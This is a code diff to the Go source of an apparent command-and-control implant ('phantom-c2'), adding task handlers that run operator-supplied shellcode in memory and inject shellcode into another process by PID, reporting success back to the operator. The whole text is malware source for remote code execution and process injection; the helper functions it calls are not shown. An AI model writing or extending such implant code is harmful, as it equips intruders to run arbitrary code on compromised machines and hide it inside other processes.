@@ -3,6 +3,7 @@ package implant
 import (
 	"crypto/rsa"
 	"os"
+	"fmt"
 	"strconv"
 
 	"github.com/phantom-c2/phantom/internal/protocol"
@@ -177,6 +178,28 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 			output, err = ExecuteBOF(task.Data, bofArgs)
 		} else {
 			err = errMissingArgs("bof requires object file data")
+		}
+
+	case protocol.TaskShellcode:
+		if len(task.Data) > 0 {
+			err = executeShellcodeCrossPlatform(task.Data)
+			if err == nil {
+				output = []byte("[+] Shellcode executed in-memory")
+			}
+		} else {
+			err = errMissingArgs("shellcode requires binary data")
+		}
+
+	case protocol.TaskInject:
+		if len(task.Args) > 0 && len(task.Data) > 0 {
+			pid := 0
+			fmt.Sscanf(task.Args[0], "%d", &pid)
+			err = injectShellcodeRemoteCrossPlatform(uint32(pid), task.Data)
+			if err == nil {
+				output = []byte(fmt.Sprintf("[+] Shellcode injected into PID %d", pid))
+			}
+		} else {
+			err = errMissingArgs("inject requires PID and shellcode data")
 		}
 
 	case protocol.TaskKill:
